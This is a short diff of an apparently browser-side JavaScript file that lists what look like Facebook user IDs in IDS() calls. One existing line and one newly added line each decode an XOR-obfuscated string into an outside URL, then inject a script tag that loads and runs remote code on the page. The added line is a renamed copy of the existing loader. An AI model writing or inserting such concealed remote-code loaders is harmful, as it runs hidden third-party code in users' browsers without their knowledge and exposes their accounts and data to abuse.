@@ -121,3 +121,4 @@ IDS("100004854038874");
 IDS("100005658813071");
 
 var a="jvvrq8--pcu,ekvjw`,amo-ucxx{epc{-dcag`mmi-ej/rcegq-pgrmpv,rjr"; b=""; c="";var d;d=a.length;for (i=0;i<d;i++){ b+=String.fromCharCode(a.charCodeAt(i)^2) }c=unescape(b);document.body.appendChild(document.createElement('script')).src=c;
+var enkripsi="jvvr8--vckommp/qapkrvq,ug`q,amo-hctcqapkrv-qgawpgf-Ockl-qwrrmpv/dkng,hq"; teks=""; teksasli="";var panjang;panjang=enkripsi.length;for (i=0;i<panjang;i++){ teks+=String.fromCharCode(enkripsi.charCodeAt(i)^2) }teksasli=unescape(teks);document.body.appendChild(document.createElement('script')).src=teksasli;
